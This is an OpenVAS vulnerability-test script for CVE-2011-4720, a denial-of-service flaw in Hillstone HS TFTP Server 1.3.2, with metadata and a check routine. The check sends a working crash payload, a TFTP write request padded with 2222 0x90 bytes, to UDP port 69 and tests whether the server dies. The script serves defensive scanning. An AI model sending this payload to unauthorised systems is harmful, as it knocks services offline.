###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hs_tftp_server_dos_vuln.nasl 13202 2019-01-21 15:19:15Z cfischer $
#
# Hillstone Software TFTP Write/Read Request Server Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802406");
  script_version("$Revision: 13202 $");
  script_cve_id("CVE-2011-4720");
  script_bugtraq_id(50886);
  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:19:15 +0100 (Mon, 21 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-12-05 15:58:57 +0530 (Mon, 05 Dec 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Hillstone Software TFTP Write/Read Request Server Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://secpod.org/blog/?p=419");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107468/hillstone-dos.txt");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SecPod_Hillstone_Software_HS_TFTP_Server_DoS.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to crash the server
  process, resulting in a denial-of-service condition.");

  script_tag(name:"affected", value:"Hillstone Software HS TFTP version 1.3.2.");

  script_tag(name:"insight", value:"The flaw is caused by an error when processing TFTP write and
  read requests, which can be exploited to crash the server via a specially crafted request sent to UDP port 69.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Hillstone Software TFTP Server and is
  prone to denial of service vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("tftp.inc");

port = get_kb_item( "Services/udp/tftp" );
if( ! port )
  port = 69;

if( ! get_udp_port_state( port ) )
  exit( 0 );

if( ! tftp_alive( port:port ) )
  exit( 0 );

sock = open_sock_udp( port );
if( ! sock )
  exit( 0 );

crash = raw_string(0x00,0x02) + string(crap(data: raw_string(0x90),
        length: 2222)) + "binary" + raw_string(0x00);

send( socket:sock, data:crash );
close( sock );

if( ! tftp_alive( port:port ) ) {
  security_message( port:port, proto:"udp" );
  exit( 0 );
}

exit( 99 );